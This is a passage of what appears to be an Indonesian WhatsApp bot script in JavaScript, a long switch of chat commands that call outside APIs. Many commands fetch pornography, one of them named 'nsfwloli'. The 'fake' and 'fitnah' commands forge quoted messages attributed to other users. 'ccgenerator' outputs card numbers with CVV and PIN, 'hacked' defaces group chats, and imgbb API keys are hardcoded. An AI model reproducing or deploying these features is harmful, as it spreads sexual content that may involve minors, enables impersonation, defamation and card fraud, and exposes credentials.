                    for (var x in link) {
                        ini_txt += `\n${link[x].name}\n`
                        link_dl = link[x].link
                        for (var y in link_dl) {
                            ini_txt += `${y} - ${link_dl[y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumb)
                    await client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    await limitAdd(sender) 
                    break
                 case 'nekopoisearch':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
			        if (!isNsfw) return reply(' *FALSE* ')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nekopoisearch?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
                case 'elf':
                case 'nsfwloli':
                case 'nsfwneko':
				case 'chiisaihentai':
                case 'nsfwtrap':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				    if (!isNsfw) return reply(' *FALSE* ')
				    reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
                    await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${LolApi}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				    if (!isNsfw) return reply(' *FALSE* ')
				    reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
                    getBuffer(`http://api.lolhuman.xyz/api/random2/${command}?apikey=${LolApi}`).then((gambar) => {
                    client.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    await limitAdd(sender)
                    break
                case 'ngif':
                case 'nsfwnekogif':
                case 'randomhentaigif':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
					getBuffer(`http://api.lolhuman.xyz/api/random2/${command}?apikey=${LolApi}`).then((gambar) => {
						client.sendMessage(from, gambar, sticker, { quoted: mek })
})
                    break
                case 'nsfwcheck':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
					owgi = await client.downloadAndSaveMediaMessage(ted)
					tels = body.slice(10)
					reply(mess.wait)
					anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
                        get_result = await fetchJson(`http://api.lolhuman.xyz/api/nsfwcheck?apikey=${LolApi}&img=${anu.display_url}`)
						get_result = get_result.result
                        is_nsfw = "No"
                        if (Number(get_result.replace("%", "")) >= 50) is_nsfw = "Yes"
                        reply(`Is NSFW? ${is_nsfw}\nNSFW Score : ${get_result}`)
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
				case 'nhentaisearch':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                        if (!isNsfw) return reply(' *FALSE* ')
                        if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                        query = args.join(" ")
                        get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaisearch?apikey=${LolApi}&query=${query}`)
                        get_result = get_result.result
                        ini_txt = "Result : \n"
                        for (var x of get_result) {
                        ini_txt += `Id : ${x.id}\n`
                        ini_txt += `Title English : ${x.title_english}\n`
                        ini_txt += `Title Japanese : ${x.title_japanese}\n`
                        ini_txt += `Native : ${x.title_native}\n`
                        ini_txt += `Upload : ${x.date_upload}\n`
                        ini_txt += `Page : ${x.page}\n`
                        ini_txt += `Favourite : ${x.favourite}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
                case 'nhentaipdf':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (!isNsfw) return reply(' *FALSE* ')
				    reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result)
                    client.sendMessage(from, ini_buffer, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
                    await limitAdd(sender) 
                    break
                case 'nhentaiinfo':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (!isNsfw) return reply(' *FALSE* ')
				    reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                    ini_txt += `Title Native : ${get_result.title_native}\n`
                    ini_txt += `Read Online : ${get_result.read}\n`
                    get_info = get_result.info
                    ini_txt += `Parodies : ${get_info.parodies}\n`
                    ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                    ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
            case 'randombokep':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isNsfw) return reply(' *FALSE* ')
				reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
				dappz = fs.readFileSync('./IXBTEAM/18.js');
                jsonData = JSON.parse(dappz);
                babiluh = Math.floor(Math.random() * jsonData.length);
                anjglu = jsonData[babiluh];
                dapbokepp = await getBuffer(anjglu.image)
                asww = anjglu.teks
                client.sendMessage(from, dapbokepp, image, {quoted: mek, caption: asww})
				await limitAdd(sender) 
				break
		case 'santet':
			        if (!isRegistered) return reply(mess.only.userB)
			        if (isBanned) return reply(mess.only.benned)
			        if (isLimit(sender)) return reply(mess.limituser)
					if (!isGroup) return reply('Perintah ini hanya bisa di gunakan dalam group!')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(`Tag member yang mau disantet\n\nContoh : ${prefix}santet @tag | kalo berak kaga di siram`)
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (args.length === 1) return reply(`Masukkan alasan kenapa menyantet dia!!\n\nContoh : ${prefix}santet @tag | kalo berak kaga di siram`)
				    try{
					santet = ['Muntah Paku','Meninggoy','Meninggal','Berak Paku','Muntah Rambut','Muntah Jembut','Ketempelan MONYET!!!','Ketempelan Tuyul','Berak di Celana Terus','ketabrak motor','Menjadi Gila','Menjadi Bodoh','Berak Beling','Berak Batu']
					terima1 = santet[Math.floor(Math.random() * (santet.length))]
					ini_nama = args.join(" ").split("|")
					target = ini_nama[0].trim()
					alasan = ini_nama[1].trim()
					mentions(`Santet terkirim ke @${mentioned[0].split('@')[0]}\n\nAlasan: ${alasan}\n\nJenis Santet Yang di Terima:\n*${terima1}*`, mentioned,true)
			        } catch (e) {
			    	console.log(`Error :`, color(e,'red'))
					reply(`Format salah! Contoh: ${prefix}santet @tag | kalo pipis g disiram`)
					}
					break
		case 'bokep':
			     if (!isRegistered) return reply(mess.only.userB)
			     if (isBanned) return reply(mess.only.benned)
			     if (isLimit(sender)) return reply(mess.limituser)
				 if (!isNsfw) return reply(' *FALSE* ')
				 reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
				 data = fs.readFileSync('./IXBTEAM/18.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 randBokep = await getBuffer(randKey.image)
                 randTeks =randKey.teks
                 client.sendMessage(from, randBokep, image, {quoted: mek, caption: randTeks})
				 await limitAdd(sender) 
				 break 
			case 'pornhub':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    reply(mess.wait)
              	    if (args.length < 1) return reply('teksnya mana gan?')
                    teks = body.slice(9)
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/pornhubsearch?apikey=${LolApi}&query=${teks}`, {method: 'get'})
                    teks = `===============\n`
                    for (let bokep of anu.result) {
                    teks += `Title: ${bokep.title}\nAktor: ${bokep.author}\nViewers: *${bokep.views}*\nDurasi: ${bokep.duration}\nLink: ${bokep.link}\n===============\n`
                    }
                    reply(teks.trim())
			     	await limitAdd(sender) 
			     	break  
			     case 'xvideos':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					if (!isPremium) return reply(mess.only.premium)
              	    if (args.length < 1) return reply('teksnya mana gan?')
					  reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
                    anu = await fetchJson(`https://api.arugaz.my.id/api/media/xvideo/search?query=${body.slice(9)}`, {method: 'get'})
                    teks = `===============\n`
                    for (let b of anu.result) {
                    teks += `• Title: ${b.title}\n• Info: ${b.info}\n• Link: ${b.link}\n===============\n`
                    }
                    reply(teks.trim())
			     	await limitAdd(sender) 
			     	break 
			
			case 'xhamstersearch':
				    if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
					reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xhamstersearch?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
                case 'xhamster':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					if (!isPremium) return reply(mess.only.premium)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://xhamster.com/videos/party-with-friends-end-in-awesome-fucking-5798407`)
					reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xhamster?apikey=${LolApi}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Uploader : ${get_result.author}\n`
                    ini_txt += `Upload : ${get_result.upload}\n`
                    ini_txt += `View : ${get_result.views}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.likes}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
					videos = await getBuffer(get_result.download["144p"])
                    client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
					client.sendMessage(from, videos, video, { quoted: mek })
                    await limitAdd(sender) 
                    break
					
                case 'xnxxsearch':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)
					if (!isPremium) return reply(mess.only.premium)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
					reply ('otw gan... *DOSA TANGGUNG SENDIRI*')
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxxsearch?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender) 
                    break
				case 'xnxxdl':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
						if (!isPremium) return reply(mess.only.premium)
					    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
					    try{
			            anu = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=${LolApi}&url=${args[0]}`)
			            yty = `*Title :* ${anu.result.title}\n*Duration :* ${anu.result.duration}\n*View :* ${anu.result.view}\n*Rating :* ${anu.result.rating}\n*VIDEO LAGI DI DOWNLOAD 1-5 MENIT*\n\nNOTE: DOSA TANGGUNG SENDIRI`
			            bufft = await getBuffer(anu.result.thumbnail)
			            reply(mess.wait)
			            buffer = await getBuffer(anu.result.link[1].link)
			            client.sendMessage(from, bufft, image, {quoted: mek, caption: yty})
			            client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek})
			            await limitAdd(sender) 
				        } catch (e) {
				        console.log(`Error :`, color(e,'red'))
				        reply(mess.error.bug)
			            }
					    break
				
///FITUR RANDOM
            case 'emojipng':
                iniss = `${body.slice(10)}`
				anusj = await getBuffer(`https://api.zeks.me/api/emoji-image?apikey=${zeksapi}&emoji=${encodeURIComponent(iniss)}`, {method: 'get'})
				client.sendMessage(from, anusj, image,{quoted : mek, caption : 'DONE'})
				break
            case 'give':
				if (!isOwner) return reply(mess.only.ownerB)
				var group = await client.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					givee = `*Giveaway Script Bot WhatsApp 500 Fitur*

*_Syarat :_*FOLOW IG OWNER*
https://www.instagram.com/drabhalle.68/


*JIKA TIDAK MEMENUHI SYARAT DIATAS DIANGGAP HANGUS PENGUMUMAN BESOK DI STORY IG/DI GROUP DISKUSI BOT, PANTENGIN AJA*`
                 client.sendMessage(from, givee, MessageType.text, { contextInfo: { mentionedJid: mem },
				 quoted: mek})
                 break
             case 'fake':
                if (args.length < 1) return reply(`Usage :\n${prefix}fake [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fake 0|hai|hai juga markenlin`)
                var gh = body.slice(6)
                var parti = gh.split("|")[0];
                var target = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    client.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${target}` }}})
				break 
             case 'upstory':
                 if (!isOwner) return reply(mess.only.ownerB)
                    teks = body.slice(9)
                    client.sendMessage('status@broadcast', teks, MessageType.text)
                    croo = '*Succes sendtext to story*'
                    costum('Done..', text, tescuk, croo)
                    break
				case 'hacked':
						  if (!isOwner) return reply(mess.only.ownerB)
						  reply('Otw Hack')
						  tessgc = await getBuffer(`https://i.ibb.co/PrLdfrx/dsgrsgdrsgrs.png`)
						  client.updateProfilePicture (from, tessgc)
						  await sleep(1000)
						  client.groupUpdateSubject(from, `HACKED BY OWNER GANS`)
						  await sleep(1000)
						  client.groupUpdateDescription(from, `*Owner BOT telah meretas grup ini*`)             
						  await sleep(1000)
						  client.sendMessage(from, 'Succes Hacked Boskuu', text, {quoted: mek})
        case 'fml2':
					data = await fetchJson(`https://tobz-api.herokuapp.com/api/randomfmylife?apikey=BotWeA`)
					teks  = `${data.result}`
					cr8= '*_FUCK MY LIFE_*'
					client.sendMessage(from, teks, text, {
                       quoted: {
                       key: {
                       fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {
                remoteJid: `6281368646011-1614335465@g.us`
                }: {})
                }, message: {
                    "audioMessage":{"url":"https://mmg.whatsapp.net/d/f/AiK7xYTOeDzW9vlmhaL7H8xcJmR_3S3cApUx_g3VFVlH.enc","mimetype":"audio/mp4","fileSha256":"E2+iQCls2RoadrR2DTnAHFzYfvZISFAb8MhEV460+Qg=","fileLength":"221009","seconds":1000000000,"ptt":true,"mediaKey":"zQGw5i5gsZ0Uep5w0Ktk/mfSh8SNvIzJEcrpg58lmfo=","fileEncSha256":"O2K89/VuRVNAAcG+iiQxr1SWZzUabm5V7VdJDSkgueY=","mediaKeyTimestamp":"1614234551","contextInfo":{"forwardingScore":999,"isForwarded":true}}}}})
					break
			case 'upname':
                if (!isOwner) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Textnya mana kak?')
                anu = body.slice(8)
                client.updateProfileName(anu)
                reply(`Succes change name to : ${anu}`)
                break
                case 'fotocewek':
					 // Case Case & Case				
					 if (!isRegistered) return reply(mess.only.userB)
					 if (isBanned) return reply(mess.only.benned)
					 if (isLimit(sender)) return reply(mess.limituser)
	                                    const cangti = ['https://i.ibb.co/1T1DCz7/cewek-thailand-20200325-007-non-fotografer-kly.jpg','https://i.ibb.co/FsJ6jjs/kucing2.jpg','https://i.ibb.co/vvkdS7n/kucing3.jpg','https://i.ibb.co/1QHWxts/kucing4.jpg','https://i.ibb.co/JQmRz4n/kucing5.jpg','https://i.ibb.co/tBwrFkG/kucing6.jpg','https://i.ibb.co/dp0YhYm/kucing7.jpg','https://i.ibb.co/R03smZT/kucing8.jpg','https://i.ibb.co/17tw0dp/kucing9.jpg','https://i.ibb.co/7XdGGqc/kucing10.jpg','https://i.ibb.co/XL9PZxg/kucing11.jpg','https://i.ibb.co/gyjvXWN/kucing12.jpg','https://i.ibb.co/R4gg4wH/kucing13.jpg','https://i.ibb.co/PmLYtFm/kucing14.jpg','https://i.ibb.co/XbSDh47/kucing15.jpg','https://i.ibb.co/kSXNJzt/kucing16.jpg']
                                        let cangtip = cangti[Math.floor(Math.random() * cangti.length)]
                                        client.sendMessage(from, cangtip, image, {quote: mek})
					                    await limitAdd(sender)
                                        break
        case 'ccgenerator': // By Anker
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
                   reply(`_[❕] Loading_`)
				   anu = await fetchJson(`https://videfikri.com/api/ccgenerator/`, {method:'get'})
				   teks = `*Hasil CCGenerator*\n*♻️NUMBER*: ${anu.result.card.number}\n*♻️TYPE*: ${anu.result.card.network}\n*♻️CVV*: ${anu.result.card.cvv}\n*♻️PIN*: ${anu.result.card.pin}\n*♻️MONEY*: ${anu.result.card.balance}\n*♻️EXPIRE-MONTH*: *Custom*\n*♻️EXPIRE-YEAR*: *Custume*\n*♻️COUTRY*: ${anu.result.customer.country}\n*♻️NAME*: ${anu.result.customer.name}\n*♻️ADDRESS*: ${anu.result.customer.address}`
				   client.sendMessage(from, teks, text, {quoted: mek})
				   await limitAdd(sender)
				   break
				case 'fml':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					anu = await fetchJson(`https://api.zeks.me/api/fml`, {method: 'get'})
					fmll = `*Fml* : *${anu.result}*`
					client.sendMessage(from, fmll, text, {quoted: mek})
					await limitAdd(sender) 
					break 
			case 'katabijak1':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
					anu = await fetchJson(`https://pencarikode.xyz/api/katabijak?apikey=pais`, {method: 'get'})
					katabijak = `Kata Bijak: *${anu.message}*`
				client.sendMessage(from, katabijak, text, {quoted: mek})
					await limitAdd(sender) 
					break
			case 'htmlscraper':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
					anu = await fetchJson(`https://pencarikode.xyz/html?url=${body.slice(13)}&apikey=pais`, {method: 'get'})
					client.sendMessage(from, `${anu.html}`, text, { quoted: mek})
					await limitAdd(sender) 
					break 					
			case 'profiltiktok':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
                    anu = await fetchJson(`https://pencarikode.xyz/html?url=${body.slice(14)}&apikey=pais`, {method: 'get'})
			        tiktok = await getBuffer(anu.result.profile_pic)
                    client.sendMessage(from, tiktok, image, {quoted: mek})
			        await limitAdd(sender) 
			        break 
			case 'randomkick':
					if (!isRegistered) return reply(mess.only.userB)
				    if (isBanned) return reply(mess.only.benned)
				    if (isLimit(sender)) return reply(mess.limituser)
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					membr = []
					const nuss = groupMembers
					const msls = groupMembers
					const siapsss = nuss[Math.floor(Math.random() * nuss.length)]
					const sipsss = pushname[Math.floor(Math.random() * msls.length)]
					teks = `*Yang Akan Di Kick Disini Adalah :* @${siapsss.jid.split('@')[0]}`
					membr.push(siapsss.jid)
					if (membr.length > 1) {
						teks = 'Perintah di terima, mengeluarkan :\n'
						for (let _ of membr) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, membr, true)
						client.groupRemove(from, membr)
					} else {
						mentions(`Perintah di terima, mengeluarkan : @${membr[0].split('@')[0]}`, membr, true)
						client.groupRemove(from, membr)
					}
					break
			case 'ep':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply('Pilih themenya gan, 1 - 162\n\nContoh Penggunaan: !tp/1/Ixb')
				textpro = body.slice(4)
				txtpro1 = textpro.split("/")[0];
				txtpro2 = textpro.split("/")[1];
				buff = await getBuffer(`https://mhankbarbar.tech/api/ephoto?pack=${txtpro1}&text=${txtpro2}&apiKey=${BarBarApi}`, {method: 'get'})
				client.sendMessage(from, buff, image, {quoted: mek})
				await limitAdd(sender)
				break
			case 'tp':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply('Pilih themenya gan, 1 - 162\n\nContoh Penggunaan: !tp/1/Farhan')
				textpro = body.slice(4)
				txtpro1 = textpro.split("/")[0];
				txtpro2 = textpro.split("/")[1];
				buff = await getBuffer(`https://mhankbarbar.tech/api/textpro?pack=${txtpro1}&text=${txtpro2}&apiKey=${BarBarApi}`, {method: 'get'})
				client.sendMessage(from, buff, image, {quoted: mek})
				await limitAdd(sender)
				break
            case 'fitnah':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
				var ghha = body.slice(8)
				var replace = ghha.split("|")[0];
				var targetnye = ghha.split("|")[1];
				var botty = ghha.split("|")[2];
				client.sendMessage(from, `${botty}`, text, {quoted: { key: { fromMe: false, participant: `${mentionUser}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${targetnye}` }}})
				break
			case 'testime':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
					setTimeout( () => {
					client.sendMessage(from, 'Waktu habis:v', text, {quoted: mek}) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '5 Detik lagi', text, {quoted: mek}) // ur cods
					}, 5000) // 1000 = 1s,
					setTimeout( () => {
				    client.sendMessage(from, '10 Detik lagi', text, {quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					break 

               case 'cersex':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
                   anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cersex?apikey=MIMINGANZ`) 
                   buffer = await getBuffer(anu.gambar) 
                   s3x = `*[ CERITA S3X ]*\n\n\nCerita : ${anu.result}`
                   client.sendMessage(from, buffer, image, {quoted: mek, caption: s3x})
                   await limitAdd(sender) 
                   break 
              case 'kpop':
				if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                   anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomkpop?apikey=${TobzApi}`, {method: 'get'})
                   buff = await getBuffer(anu.result)
                   client.sendMessage(from, buff, image, {quoted: mek})
                   break 
               case 'puisiimg':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
                   pus = await getBuffer(`https://api.vhtear.com/puisi_image&apikey=${VthearApi}`, {method: 'get'})
                   client.sendMessage(from, pus, image, {quoted: mek})
                   break 
				case 'tahta':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    tahta = `${body.slice(7)}`
                    if (args.length < 1) return reply('Teksnya mana gan??')
                    if (args.length > 10) return reply('karakter minimal 10')
                    buff = await getBuffer(`https://api.zeks.me/api/hartatahta?text=${tahta}&apikey=${ZeksApi}`, {method: 'get'})
                    client.sendMessage(from, buff, image, {quoted: mek, caption: `Harta Tahta ${tahta}`})
                    await limitAdd(sender) 
                    break  
		 case 'tahtapremium':
                if (!isRegistered) return reply(mess.only.userB)
                if (isLimit(sender)) return reply(mess.limituser)
                if (isBanned) return reply(mess.only.benned)
				if (!isPremium) return reply(mess.only.premium)
				if (args.length == 0) return reply(`Example: ${prefix + command} Ivan Nanda`)
				query = args.join("%0A")
                reply(ind.wait())
                ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/hartacustom?apikey=${LolApi}&text=${query}`)
                client.sendMessage(from, ini_buffer, image,  {quoted: mek})
                await limitAdd(sender)
                break
				case 'drawing':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                    owgi = await client.downloadAndSaveMediaMessage(ted)
                    tels = body.slice(7)
                    anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
                    hehqe = await getBuffer(`https://videfikri.com/api/textmaker/pencildrawing/?urlgbr=${anu.display_url}`)
                    client.sendMessage(from, hehqe, image, {quoted:mek}).then(() => {
					fs.unlinkSync(owgi)
					})
                    } else {
                    reply('reply imagenya kak!')
                    }
                    break 
				case 'hackermaker':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
							if (!isPremium) return reply(mess.only.premium)
						reply(mess.wait)
						query = args.join(" ")
						cap = `Ini kak ${pushname} \nUdah jadi pesanannya`
						riu = await getBuffer(`https://api.vhtear.com/hacker_avatar?text=${query}&apikey=${VthearApi}`)
						client.sendMessage(from, riu, image, {quoted: mek, caption: cap})
						break
				case 'glowmetallic':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
							if (!isPremium) return reply(mess.only.premium)
						reply(mess.wait)
						query = args.join(" ")
